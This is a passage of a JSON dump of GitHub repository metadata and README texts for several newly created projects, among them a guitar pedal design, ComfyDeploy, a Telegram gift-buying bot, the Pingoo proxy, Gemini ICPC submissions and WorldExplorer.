[
  {
    "basic_info": {
      "name": "GuitarPedal",
      "full_name": "torvalds/GuitarPedal",
      "owner": "torvalds",
      "description": null,
      "url": "https://github.com/torvalds/GuitarPedal",
      "clone_url": "https://github.com/torvalds/GuitarPedal.git",
      "ssh_url": "git@github.com:torvalds/GuitarPedal.git",
      "homepage": null,
      "created_at": "2025-09-17T01:01:29Z",
      "updated_at": "2025-09-18T10:29:23Z",
      "pushed_at": "2025-09-18T01:29:25Z"
    },
    "stats": {
      "stars": 395,
      "forks": 10,
      "watchers": 395,
      "open_issues": 2,
      "size": 1853
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": "GNU General Public License v2.0",
      "topics": []
    },
    "content": {
      "readme": "## Random guitar pedal board design\n\n### Background\n\nThis is a personal toy project that has gone through several phases, but\nthe common theme has been that it makes absolutely no sense outside of\nthe very specific niche of \"Linus is trying to learn random things about\nelectronics\".\n\nSo keep that in mind: there is very little point to any of this to\nanybody else.  Don't expect some great useful guitar pedal experience.\n\nI call it my \"LEGO for adults\" hobby, because this got started when I\nwanted to extend my traditional after-Christmas activity (which was\nreceiving and building _actual_ LEGO kits, which has been a thing for me\nsince I was a wee tyke) with something else.\n\nSo for Christmas 2024, I got a new soldering iron and randomly started\ndoing guitar pedal kits.  And so over the next month or two, I built at\nleast two dozen kits, and had to literally look for victims to give them\naway to because I had no use for them myself.\n\n> [!NOTE]\n> Of all the kits I built, the ones I enjoyed the most were the Aion FX\n> ones, and if you are looking for a kit build of traditional analog\n> guitar pedals, I can heartily recommend them.\n>\n> The documentation, the customer service, the components, and the\n> enclosures were all top notch. See [\"Aion FX\"](https://aionfx.com/)\n\nAnyway, after building a lot of these traditional analog guitar pedal\nkits I decided I really wanted to actually understand what they did,\nbecause I really had very little experience with any analog circuits.\n\nWhile I've done some very limited electronics most of my life, almost\nall of it has been related to computers, so it's been either digital\nlogic or power supplies for them.\n\nAlso, I was looking for a different kind of soldering experience where\nthere was less snipping of legs of through-hole components.  I actually\nlike soldering SMT components, but that doesn't tend to be what those\nguitar pedal kits do.\n\nI had done some very limited PCB design with kicad a few years ago, so I\ndecided to just start learning more about analog circuits.  And then it\nkind of grew from that.\n\n### Electrical design\n\nThis is the \"fourth generation\" of my guitar pedal design journey, and\nis a new repository because the goal of the learning experience has\nevolved.\n\nWhat started out being about the analog circuits (and the power rails:\nthose were always a big thing) got to the point where I realized I\nreally want to do a mixed signal design: understanding what the circuits\ndo is one thing, re-creating some analog design from the 70s when you\ndon't actually care about the sound is another thing entirely.\n\nAlso, on the actual analog signal side, I started out using op-amps, but\nas I was attempting to learn how things actually worked, I had switched\nover to a \"discrete components only\" model, and this continues that\ntrend (except for the whole digital side, of course).\n\n> [!NOTE]\n> To me \"discrete components\" does include more optimized packages:\n> things like dual diodes or matched transistors, but not more complex\n> circuits like a op-amp (or a 555 timer or D Flip-flop or other classic\n> logic IC)\n\nAlso, because I don't typically *listen* to the end result, but look at\nit with a signal generator and an oscilloscope, I've grown to detest\npower supply noise.\n\nNot knowing what I was doing, quite a lot of my circuits have been very\nnoisy indeed, and have coupled in noise from the power supply into the\nsignal chain, and you can really see that on an oscilloscope even when\nit's not always audible.\n\nEven in op-amp designs, where the op-amp itself has a very high PSRR and\nisn't mixing power supply noise into the signal, my biasing circuits\nwere often not great, and so the op-amp would see not just the signal\nbut the power supply noise coming in through the DC biasing.\n\nAnd every time I tried a dual power rail (so that I could just keep the\nsignal ground-referenced), the noise from the switching ended up just\nalways noticeable, and the extra complexity was annoying when a lot of\neffects then didn't have any real use for the dual rail.\n\nFiltering obviously helps, but this is just a long-winded explanation\nfor why I ended up really appreciating the \"bias to ground\" JFET model\nfor the signal input side, and the common drain follower in particular.\n\nThat works with a single JFET (the MMBF5103 worked well for me), but my\nfavorite design so far is a dual-JFET LS844 with the second matched JFET\nused as a current sink.  It has basically infinite input impedance (and\ncould be DC coupled, although I do the coupling capacitor with resistor\nto ground) and gives a good output signal somewhere roughly in the\nmiddle of the single-supply 9V rail.\n\nSee [LS844 Application note](https://www.linearsystems.com/_files/ugd/7e8069_52b1022fbded45fab609459acb337629.pdf)\n\nWhy do I mention this in particular? Mainly because it's a great example\nof how completely *insane* my designs are.  That LS844 is used as a\nvoltage follower with a noticeable DC offset, and that single dual-JFET\nSOT-23-6 component is m",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:48.592492"
  },
  {
    "basic_info": {
      "name": "comfydeploy",
      "full_name": "comfy-deploy/comfydeploy",
      "owner": "comfy-deploy",
      "description": "ComfyDeployed",
      "url": "https://github.com/comfy-deploy/comfydeploy",
      "clone_url": "https://github.com/comfy-deploy/comfydeploy.git",
      "ssh_url": "git@github.com:comfy-deploy/comfydeploy.git",
      "homepage": null,
      "created_at": "2025-09-17T02:53:50Z",
      "updated_at": "2025-09-18T10:28:36Z",
      "pushed_at": "2025-09-17T15:03:11Z"
    },
    "stats": {
      "stars": 208,
      "forks": 30,
      "watchers": 208,
      "open_issues": 0,
      "size": 323
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": "GNU General Public License v3.0",
      "topics": []
    },
    "content": {
      "readme": "# ComfyDeploy\n\nRe: Open-sourcing ComfyDeploy\n\nTL;DR: We are open-sourcing ComfyDeploy again, with full platform backend + frontend.\n\n[Discord](https://discord.gg/qtHUaVNRVM) | [Website](https://www.comfydeploy.com)\n\n---\n\n### How we got here?\n\nIn late 2023, I started ComfyDeploy as an open source project while I was working at my previous company. We had a problem deploying ComfyUI to our production server due to how complicated it is to get ComfyUI into a serverless environment.\n\nLittle did I know I was going to meet my co-founder Nick and embark on a journey I never dreamt of.\n\nI posted on Twitter about this little project that I was working on as an indie hacker, and it blew up overnight. I woke up to 100k impressions on the post. I put up my cal link and people started scheduling calls. I got to talk to a bunch of people across the globe, with people reaching out to help or potentially use ComfyDeploy.\n\nNick was one of the early contributors, and later we decided to apply to a bunch of accelerators together. It was early February, just a couple of weeks after we met. We applied to YC‚Äîwe were unsure if we would even get in, but we still decided to quit our jobs, and the day after we quit, we got in.\n\nIt was insane to even think that we would have had a chance.\n\n### Life Changing Decision\n\nWe immediately said yes.\n\nWe got into YC with ComfyDeploy around 2.5K MRR.\n\nAround the same timeframe, ComfyOrg was introduced, Stability collapsed, and Flux just came out.\n\nWe kept building ComfyDeploy, for months, and kept things going.\n\nThe company was growing, but very slowly. We realized the biggest issue is that we are still really early, and it takes time for businesses and enterprises to really adopt such a niche tool. And we are not ComfyOrg.\n\n### Dynamic Changes\n\nMeanwhile, closed source models dropped, and a bunch of workflows that we knew became no longer useful.\n\nComing from a game developer background, I saw huge potential with ComfyUI at first, but I never would have imagined that one giant model could do exactly what you put into words, and you still need workflows to fine-tune and control the exact outputs. And ComfyDeploy did make it possible for teams to experiment with this.\n\nWe were just unsure about the future of the company. While we kept getting more and more business inquiries about ComfyUI, this is what really kept us going before giving up. It's a mixed signal.\n\nMeanwhile, my friends bootstrapped their mobile app to $500k a month. I was really stressed‚Äîwere we going to live up to the aspirations that we set out, both personally and for the company?\n\n### Problems\n\nI feel immensely grateful for the customers that we were able to help, and this is something I feel forever privileged to experience‚Äîworking with the best creative teams across the globe and brands that I look up to.\n\nBut we were stuck in the middle. First, we are not ComfyOrg; second, closed source models were doing things way better and slowly eating up the market.\n\nAnd it's inevitable that ComfyOrg will have some sort of cloud solution. And we do appreciate all the work ComfyOrg has put into making ComfyUI great again. We realized we would be competing in some ways especially in the cloud space, and we could never grow out of this, which constrained the company's growth at the same time.\n\nAs of today, ComfyDeploy is doing $29k MRR, and our last 30 days' revenue was $50k processed. Which is the highest we have ever got, but also the most depressing day I have ever had.\n\n### So what now?\n\nWe have been working for months on our pay-as-you-go tier‚Äîno longer requiring you to talk to us, just pay for the cloud resources you use. And also, going back to our roots: open-sourcing the ENTIRE CLOUD PLATFORM while continuing to support existing customers.\n\nOur current customers and creative teams are the people who kept us going for the last year, and I will be forever grateful. But this might just not be the field for us, and we respect Comfy and do not want to get in the way. And I think it's going to be really good for everyone.\n\n#### What does this mean for current customers: \n\nThe service will stay online and supported until the last standing user!\n\n#### What does this mean for future customers: \nYou can either go with the pay-as-you-go tier to get started, or self-host the entire platform. If ComfyOrg eventually builds something like ComfyDeploy, the official solution will be recommended by us!\n\n#### What does this mean for ComfyDeploy team: \n\nWe will continue supporting existing customers. At the same time we will start exploring new ideas. And this does not mean the end to us. But rather a fresh start. Stay tuned for what's coming next.\n\n#### What I will be doing for the next couple days\n1. Documentation and tutorials to set up ComfyDeploy\n2. Explore new problems that could resonate with us.\n\n### Credits\n\nA list of credits that got us here (doesn't go in order)\nComfy, Nick, Karrix, Jeff, Edgar, Ecjojo, Brad, Aashay and Semil, Jon, Choco",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:49.721422"
  },
  {
    "basic_info": {
      "name": "Gift-Buyer-Tg",
      "full_name": "GothemU/Gift-Buyer-Tg",
      "owner": "GothemU",
      "description": "Bot that searches and buys telegram gifts based on given criteria",
      "url": "https://github.com/GothemU/Gift-Buyer-Tg",
      "clone_url": "https://github.com/GothemU/Gift-Buyer-Tg.git",
      "ssh_url": "git@github.com:GothemU/Gift-Buyer-Tg.git",
      "homepage": "",
      "created_at": "2025-09-17T17:32:03Z",
      "updated_at": "2025-09-18T10:33:02Z",
      "pushed_at": "2025-09-18T10:32:59Z"
    },
    "stats": {
      "stars": 137,
      "forks": 22,
      "watchers": 137,
      "open_issues": 0,
      "size": 44
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 61661,
        "Batchfile": 536
      },
      "license": "Apache License 2.0",
      "topics": [
        "gift-buyer",
        "gift-buyer-tg",
        "telegram-gift",
        "telegram-gift-buyer"
      ]
    },
    "content": {
      "readme": "# Auto Telegram Gift Buyer Bot‚úà\n[![Static Badge](https://img.shields.io/badge/Telegram-Channel-Link?style=for-the-badge&logo=Telegram&logoColor=white&logoSize=auto&color=blue)](https://t.me/+pB6j65Kv7cdjZmU0)\n\n**A bot that searches for available gifts and purchases them based on given criteria. Supports integration with Telegram bot!**\n\n# Previewüñº\n\n<img width=\"666\" height=\"306\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f69ae513-4a49-4678-9c46-0992dc9a2826\" />\n\n\n\n\n# Features‚ú®\n- **Fully automatic scans for new gifts**\n- **Fully customizable settings**\n- **Telegram bot integration available**\n- **Incredible fast gift purchase(5+ gifts per second)**\n- **Continuously searches for gifts while the script is online.**\n- **(Check Tonnel gift prices right inside the script.**\n\nAnd more.... *in future*\n\n# Requirements\n- Python 3.10+üêç\n- Git üü¶\n- Pip üü©\n- VPS for continuously operation(unnecessary)\n\n# Installationüì©\n```shell\ngit clone https://github.com/GothemU/Gift-Buyer-Tg\ncd Gift-Buyer-Tg\nrun.bat\n```\n\n**OR**\n\n```shell\ngit clone https://github.com/GothemU/Gift-Buyer-Tg\ncd Gift-Buyer-Tg\npip install -r requirements.txt\npython main.py\n```\n\n# Configuration‚öô\n**To configure the bot, edit the config.py file**‚úÖ\n\n| Settings | Description |\n|----------------------------|:-------------------------------------------------------------------------------------------------------------:|\n| **API_ID / API_HASH**      | Platform data from which to run the Telegram session (get it from my.telegram.org)                                   |       \n| **PHONE_NUMBER**               | Phone number of the account you want to use to buy gifts                                                                 |\n| **BOT_TOKEN**              |  Get Bot Token from [@BotFather](https://t.me/BotFather) to receive notifications and control the bot through telegram(unnecessary)                                                                               |\n| **CHAT_ID** | Bot chat ID, for telegram bot integration(unnecessary)                                                                       |\n| **NFT_GIFTS_ONLY** | Buys upgradable gifts only(put True or False)                                                                     |\n| **GIFT_MIN_PRICE** | Minimum price of the gift you want to buy (put 0 for no limit)                                                                      |\n| **GIFT_MAX_PRICE** | Maximum price of the gift you want to buy(put 0 for no limit)                                                    |\n| **MAX_GIFT_SUPPLY** | Highest supply of the gift, the script wont buy if number is higher than supply of the gift(put 0 for no limit)                                                                      |\n| **QUANTITY** | Quantity of purchasable gifts(If you enter 0, the script will continue buying until you run out of stars.)                                                                   |\n| **RECEPIENT** |Recepient of the gifts. Can be @channel or @user                                                                      |\n| **BUY_MULTIPLE_GIFTS** | Buys all available gifts that meet the criteria with priority to lower supply(True or False)                                                                      |\n| **HIDE_SENDER_NAME** | Hide name of the gift sender or not                                                                     |\n\n## Supportüåü\n**Thanks for using my scripts!‚ù§**\n\n- ***Don't forget to put stars, it supports me a lot‚≠ê***\n\n- ***JOIN OUR TELEGRAM [CHAT](https://t.me/+9j5RcKMfT5s4M2Q0)***\n\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:50.826485"
  },
  {
    "basic_info": {
      "name": "pingoo",
      "full_name": "pingooio/pingoo",
      "owner": "pingooio",
      "description": "The fast and secure Load Balancer / API Gateway / Reverse Proxy with built-in service discovery, GeoIP, WAF, bot protection and much more - https://pingoo.io",
      "url": "https://github.com/pingooio/pingoo",
      "clone_url": "https://github.com/pingooio/pingoo.git",
      "ssh_url": "git@github.com:pingooio/pingoo.git",
      "homepage": "https://pingoo.io",
      "created_at": "2025-09-17T07:18:40Z",
      "updated_at": "2025-09-18T10:36:14Z",
      "pushed_at": "2025-09-18T09:23:28Z"
    },
    "stats": {
      "stars": 121,
      "forks": 5,
      "watchers": 121,
      "open_issues": 6,
      "size": 331
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 183548,
        "TypeScript": 7020,
        "Dockerfile": 6485,
        "Makefile": 2265,
        "Shell": 1620,
        "HTML": 892,
        "CSS": 620,
        "Vim Script": 19
      },
      "license": "MIT License",
      "topics": [
        "akamai",
        "anti-bot",
        "apache2",
        "api",
        "api-gateway",
        "captcha",
        "cloudflare",
        "fastly",
        "firewall",
        "haproxy",
        "load-balancer",
        "nginx",
        "pingoo",
        "proxy",
        "quic",
        "reverse-proxy",
        "rust",
        "security",
        "service-discovery",
        "waf"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <a href=\"https://pingoo.io\" target=\"_blank\" rel=\"noopener\"><img alt=\"Pingoo logo\" src=\"https://pingoo.io/icon-256.png\" height=\"128\" /></a>\n  <h1 align=\"center\">Pingoo</h1>\n  <h3 align=\"center\">The fast and secure Load Balancer / API Gateway / Reverse Proxy with built-in service discovery, GeoIP, WAF, bot protection and much more</h3>\n  <h3 align=\"center\">\n    <a href=\"https://pingoo.io\">Documentation</a> | <a href=\"https://kerkour.com/announcing-pingoo\">Read the launch post</a>\n  </h3>\n</p>\n\nOpen Source load balancers and reverse proxies are stuck in the past century with a very slow pace of development and most of the important features reserved for \"Enterprise Editions\" which lead developers to use third-party cloud services, exposing their users' traffic to legal, security and reliability risks.\n\nPingoo is a modern Load Balancer / API Gateway / Reverse Proxy that run on your own servers and already have (or will have soon) all the features you expect from managed services and even more. All of that with a huge boost in performance and security thanks to reduced latency and, of course, Rust ;)\n\n* Service Discovery (Docker, DNS...)\n* Web Application Firewall (WAF)\n* Easy compliance because the data never leaves your servers\n* Bot protection and management\n* TCP proxying\n* Post-Quantum TLS\n* GeoIP (country, ASN)\n* Static sites\n* And much more\n\n> ‚ö†Ô∏è Pingoo is currently in beta, use with caution.\n\n## Quickstart\n\n```bash\n# You have a static site in the www folder\n$ ls www\nindex.html\n$ docker run --rm -ti --network host -v `pwd`/www:/var/wwww ghcr.io/pingooio/pingoo\n# Pingoo is now listenning on http://0.0.0.0:8080\n```\n\n## Documentation\n\nSee https://pingoo.io\n\n\n## Updates\n\n[Click Here](https://kerkour.com/blog) to visit the blog and [subscribe](https://kerkour.com/subscribe) by RSS or email to get weekly / monthly updates. No spam ever, only technical deep dives.\n\n\n## Contributing\n\nPlease open an issue to discuss your idea before submitting a Pull Request.\n\n\n## Support\n\nDo you have custom needs? Do you want your features to be prioritized? Are you under attack and need help? Do you need support for deploying and self-hosting Pingoo?\n\nFeel free to reach our team of experts to see how we can help: https://pingoo.io/contact\n\n\n## Security\n\nWe are committed to make Pingoo the most secure Load Balancer / Reverse Proxy in the universe and beyond. If you've found a security issue in Pingoo, we appreciate your help in disclosing it to us in a responsible manner by contacting us: https://pingoo.io/contact\n\n\n## License\n\nMIT. See `LICENSE.txt`\n\nForever Open Source. No Open Core or \"Enterprise Edition\".\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:51.938914"
  },
  {
    "basic_info": {
      "name": "gemini_icpc2025",
      "full_name": "google-deepmind/gemini_icpc2025",
      "owner": "google-deepmind",
      "description": "Gemini 2025 ICPC World Finals Code Submissions",
      "url": "https://github.com/google-deepmind/gemini_icpc2025",
      "clone_url": "https://github.com/google-deepmind/gemini_icpc2025.git",
      "ssh_url": "git@github.com:google-deepmind/gemini_icpc2025.git",
      "homepage": "",
      "created_at": "2025-09-17T10:57:24Z",
      "updated_at": "2025-09-18T10:20:16Z",
      "pushed_at": "2025-09-17T11:09:46Z"
    },
    "stats": {
      "stars": 75,
      "forks": 5,
      "watchers": 75,
      "open_issues": 0,
      "size": 27
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 54237
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# Gemini ICPC 2025 Submissions\n\nThis repository contains the code submissions from an advanced version of\n[Gemini 2.5 Deep Think](https://blog.google/products/gemini/gemini-2-5-deep-think/)\nfor the 2025 International Collegiate Programming Contest World Finals.\n\n## License and disclaimer\n\nCopyright 2025 Google LLC\n\nAll software is licensed under the Apache License, Version 2.0 (Apache 2.0);\nyou may not use this file except in compliance with the Apache 2.0 license.\nYou may obtain a copy of the Apache 2.0 license at:\nhttps://www.apache.org/licenses/LICENSE-2.0\n\nAll other materials are licensed under the Creative Commons Attribution 4.0\nInternational License (CC-BY). You may obtain a copy of the CC-BY license at:\nhttps://creativecommons.org/licenses/by/4.0/legalcode\n\nUnless required by applicable law or agreed to in writing, all software and\nmaterials distributed here under the Apache 2.0 or CC-BY licenses are\ndistributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,\neither express or implied. See the licenses for the specific language governing\npermissions and limitations under those licenses.\n\nThis is not an official Google product.\n",
      "default_branch": "release"
    },
    "fetched_at": "2025-09-18T10:39:53.058484"
  },
  {
    "basic_info": {
      "name": "TradingView-PCapp",
      "full_name": "darklight797t6/TradingView-PCapp",
      "owner": "darklight797t6",
      "description": null,
      "url": "https://github.com/darklight797t6/TradingView-PCapp",
      "clone_url": "https://github.com/darklight797t6/TradingView-PCapp.git",
      "ssh_url": "git@github.com:darklight797t6/TradingView-PCapp.git",
      "homepage": null,
      "created_at": "2025-09-17T12:35:15Z",
      "updated_at": "2025-09-17T22:18:21Z",
      "pushed_at": "2025-09-17T12:48:01Z"
    },
    "stats": {
      "stars": 55,
      "forks": 0,
      "watchers": 55,
      "open_issues": 0,
      "size": 1463
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "\n# TradingView App on pc\n\nAccess realtime market prices and indicator values from TradingView!\n\n‚ñåFeatures\n\n- [x] Access to TradingView's enhanced data feeds\n- [x] Efficiently backtest strategies and explore different settings\n- [x] Retrieve drawings from your charts\n- [x] Compatible with invite-only indicators\n- [x] Supports a large number of simultaneous indicators (subject to rate limits)\n- [x] Realtime data streaming\n- [x] Access TradingView's technical analysis data\n- [x] Replay mode + Simulated Replay mode (for free plans)\n- [x] Retrieve historical data for specific date ranges\n- [ ] TradingView socket server compatibility layer (alpha)\n- [ ] Interact with public chats\n- [ ] Access Screener top values\n- [ ] Get Hotlists\n- [ ] Get Calendar\n- IF YOU WANT A FEATURE, ASK ME!\n\n‚ñåPotential Uses\n\n- Algorithmic trading\n- Custom Discord alerts\n- Advanced backtesting\n- Machine learning research\n- Free replay mode on certain timeframes, subject to limitations\n\n___\n\n‚ñåInstallation\n\nStable version:\n\nnpm i @mathieuc/tradingview\n\nLast version:\n\nnpm i github:Mathieu2301/TradingView-API\n\n‚ñåExamples\n\nYou can find all the examples and snippets in ./examples folder.\n\n‚ñåBefore opening an issue\n\nPlease look at examples and previously resolved issues before opening a new one. I can't help everyone (especially for questions that are not library related but JavaScript related). Thank you for your understanding.\n___\n\n```\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:54.161850"
  },
  {
    "basic_info": {
      "name": "worldexplorer",
      "full_name": "mschneider456/worldexplorer",
      "owner": "mschneider456",
      "description": "[SIGGRAPH Asia 2025] WorldExplorer: Towards Generating Fully Navigable 3D Scenes",
      "url": "https://github.com/mschneider456/worldexplorer",
      "clone_url": "https://github.com/mschneider456/worldexplorer.git",
      "ssh_url": "git@github.com:mschneider456/worldexplorer.git",
      "homepage": "https://mschneider456.github.io/world-explorer/",
      "created_at": "2025-09-17T01:03:33Z",
      "updated_at": "2025-09-18T10:13:12Z",
      "pushed_at": "2025-09-18T08:17:31Z"
    },
    "stats": {
      "stars": 46,
      "forks": 3,
      "watchers": 46,
      "open_issues": 0,
      "size": 130409
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 1361565,
        "Shell": 3692
      },
      "license": "Other",
      "topics": [
        "3d-gaussian-splatting",
        "scene-generation",
        "video-diffusion"
      ]
    },
    "content": {
      "readme": "# [SIGGRAPH Asia 2025] WorldExplorer: Towards Generating Fully Navigable 3D Scenes\n\nWorldExplorer produces high-quality scenes that remain stable under large camera motion, enabling realistic and unrestricted exploration.\n\nThis is the official repository for the SIGGRAPH Asia 2025 paper \"WorldExplorer: Towards Generating Fully Navigable 3D Scenes\".\n\n[[arXiv](https://arxiv.org/abs/2506.01799)] [[Project Page](https://mschneider456.github.io/world-explorer/)] [[Video](https://youtu.be/N6NJsNyiv6I)]\n\n![Teaser](docs/teaser.jpg \"WorldExplorer\")\n\nIf you find WorldExplorer useful for your work please consider giving a star ‚≠êÔ∏è and citing:\n\n```\n@InProceedings{schneider_hoellein_2025_worldexplorer,\n    title={WorldExplorer: Towards Generating Fully Navigable 3D Scenes},\n    author={Schneider, Manuel-Andreas and H{\\\"o}llein, Lukas and Nie{\\ss}ner, Matthias},\n    journal={arXiv preprint arXiv:2506.01799},\n    year={2025}\n}\n```\n\n\n## Installation\n\nWe have tested the below instructions with PyTorch 2.8.0+cu128, CUDA 12.8, PyTorch3D 0.7.8. \n\n```\nconda env create -f environment.yml\nconda activate worldexplorer\n\ncd model/stable-virtual-camera\npip install -e .\ncd ../..\n\nCUDA_HOME=/usr/local/cuda-12.8 pip install \"git+https://github.com/facebookresearch/pytorch3d.git@stable\"\npip install diffusers[\"torch\"] transformers protobuf transformers[sentencepiece] easydict plyfile\npip install --upgrade pip setuptools && pip install git+https://github.com/nerfstudio-project/nerfstudio.git@50e0e3c\npip install -U xformers --index-url https://download.pytorch.org/whl/cu128\n```\n\nIf you encounter [this issue](https://github.com/nerfstudio-project/gsplat/issues/249) during 3DGS optimization, it's likely that your CUDA version is not consistent between terminal sessions (check through `nvcc --version`). You can ensure the CUDA version stays fixed by setting the PATH variable in your `~/.bashrc`. For CUDA 12.8, this can be done by running:\n\n```\necho 'export PATH=/usr/local/cuda-12.8/bin:$PATH' >> ~/.bashrc\n```\n\n### Download checkpoints\n\nDownload the pretrained model checkpoints:\n\n```\nwget -O model/Depth_Anything_V2/checkpoints/depth_anything_v2_metric_hypersim_vitl.pth \"https://huggingface.co/depth-anything/Depth-Anything-V2-Metric-Hypersim-Large/resolve/main/depth_anything_v2_metric_hypersim_vitl.pth?download=true\"\n\nwget -O model/Video-Depth-Anything/checkpoints/video_depth_anything_vits.pth \"https://huggingface.co/depth-anything/Video-Depth-Anything-Small/resolve/main/video_depth_anything_vits.pth?download=true\"\n``` \n\n### Authenticate with Hugging Face\n\nThe `FLUX.1-dev` model used for initial image generation is gated and requires authentication.\n\n1. Request access to the model on its Hugging Face page:\n   https://huggingface.co/black-forest-labs/FLUX.1-dev\n\n2. Log in through the terminal and add a read-only token: \n   ```bash\n   pip install -U \"huggingface_hub[cli]\"\n   hf auth login\n   ```\n\nThe weights for the model will automatically be downloaded and saved the first time you generate a scene.\n\n## Usage\n\nWorldExplorer provides a command-line interface through `worldexplorer.py` for generating scene scaffolds (panoramas with known camera extrinsics and intrinsics) and 3D scenes.\n\n### Quick Start\n\nGenerate a complete 3D scene from a text description:\n```bash\npython worldexplorer.py generate \"bioluminescent, gravity-defying, telepathic cosmic jellyfish hive\"\n```\n\nPlease note that full 3D scene generation takes about 6 to 7 hours as 32 videos are generated in the process. The simplest way to track your progress is by checking the output at `./scenes/[theme_name]_[translation_scaling_factor]_[timestamp]/img2trajvid`.\n\n### Available Commands\n\n#### 1. `generate` - Full Pipeline (Scaffold + 3D Expansion)\nGenerates panoramic images from text and expands them into navigable 3D scenes.\n\n```bash\n# Indoor scene with automatic selection (CLIP-based)\npython worldexplorer.py generate \"Modern Apartment\" --mode automatic\n\n# Indoor scene with manual selection (yiels best results!)\npython worldexplorer.py generate \"Cozy Library\" --mode manual\n\n# Indoor scene with fast mode\npython worldexplorer.py generate \"Rustic Farmhouse (Wood, Leather, Wool)\" --mode fast\n\n# Custom/outdoor scene (requires four separate prompts for each viewing direction)\npython worldexplorer.py generate --custom\n\n# Skip 3D expansion (scaffold only)\npython worldexplorer.py generate \"Beach House\" --skip-expansion\n```\n\n**Options:**\n- `--mode, -m`: Panorama scaffold generation mode - `fast` (single output), `automatic` (CLIP selection), or `manual` (human curation)\n- `--translation-scaling, -t`: Movement scale factor (default: 3.0). The higher the translation scaling factor, the further your trajectories will expand into the scene. For indoor scenes the recommended range is 2.0 to 7.0, and for outdoors scenes 8.0 to 20.0. \n- `--skip-expansion`: Generate scaffold only without 3D expansion\n- `--custom, -c`: Custom mode for outdoor scenes or custom indoor scenes\n- `--root-dir`: Directory containing ",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:55.311197"
  },
  {
    "basic_info": {
      "name": "ECE_F_CRT_PYTHON",
      "full_name": "gilshan-s/ECE_F_CRT_PYTHON",
      "owner": "gilshan-s",
      "description": "CODING",
      "url": "https://github.com/gilshan-s/ECE_F_CRT_PYTHON",
      "clone_url": "https://github.com/gilshan-s/ECE_F_CRT_PYTHON.git",
      "ssh_url": "git@github.com:gilshan-s/ECE_F_CRT_PYTHON.git",
      "homepage": null,
      "created_at": "2025-09-17T04:49:52Z",
      "updated_at": "2025-09-17T05:02:14Z",
      "pushed_at": "2025-09-17T04:49:52Z"
    },
    "stats": {
      "stars": 38,
      "forks": 41,
      "watchers": 38,
      "open_issues": 0,
      "size": 0
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# ECE_F_CRT_PYTHON\nCODING\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:56.424917"
  },
  {
    "basic_info": {
      "name": "usgc-invoice",
      "full_name": "usgraphics/usgc-invoice",
      "owner": "usgraphics",
      "description": "Invoice LaTeX template",
      "url": "https://github.com/usgraphics/usgc-invoice",
      "clone_url": "https://github.com/usgraphics/usgc-invoice.git",
      "ssh_url": "git@github.com:usgraphics/usgc-invoice.git",
      "homepage": null,
      "created_at": "2025-09-17T17:37:28Z",
      "updated_at": "2025-09-18T09:14:13Z",
      "pushed_at": "2025-09-17T17:40:48Z"
    },
    "stats": {
      "stars": 38,
      "forks": 4,
      "watchers": 38,
      "open_issues": 2,
      "size": 5
    },
    "tech_info": {
      "language": "TeX",
      "languages": {
        "TeX": 2539
      },
      "license": "BSD 3-Clause \"New\" or \"Revised\" License",
      "topics": []
    },
    "content": {
      "readme": "# usgc-invoice\nLaTeX template used by U.S. Graphics Company. Licensed under BSD 3 clause license, see LICENSE.md. Credit to U.S. Graphics Company would be much appreciated :)\n\n<img width=\"640\" alt=\"screenshot-2025-09-17_19-38-40\" src=\"https://github.com/user-attachments/assets/74e11f1d-00c7-48b5-b9ed-c9773220a910\" />\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-09-18T10:39:57.544551"
  },
  {
    "basic_info": {
      "name": "daedalus-keyboard",
      "full_name": "Perseus333/daedalus-keyboard",
      "owner": "Perseus333",
      "description": "An open-source, split, wireless ergonomic keyboard with trackpad and encoder",
      "url": "https://github.com/Perseus333/daedalus-keyboard",
      "clone_url": "https://github.com/Perseus333/daedalus-keyboard.git",
      "ssh_url": "git@github.com:Perseus333/daedalus-keyboard.git",
      "homepage": "https://perseuslynx.dev/projects/daedalus-kb",
      "created_at": "2025-09-17T09:29:38Z",
      "updated_at": "2025-09-18T09:28:21Z",
      "pushed_at": "2025-09-18T08:39:59Z"
    },
    "stats": {
      "stars": 32,
      "forks": 0,
      "watchers": 32,
      "open_issues": 0,
      "size": 98245
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": "GNU Affero General Public License v3.0",
      "topics": [
        "ergonomic-keyboard",
        "keyboard",
        "mechanical-keyboard",
        "rotary-encoder",
        "split-keyboard",
        "trackpad",
        "wireless-keyboard",
        "zmk"
      ]
    },
    "content": {
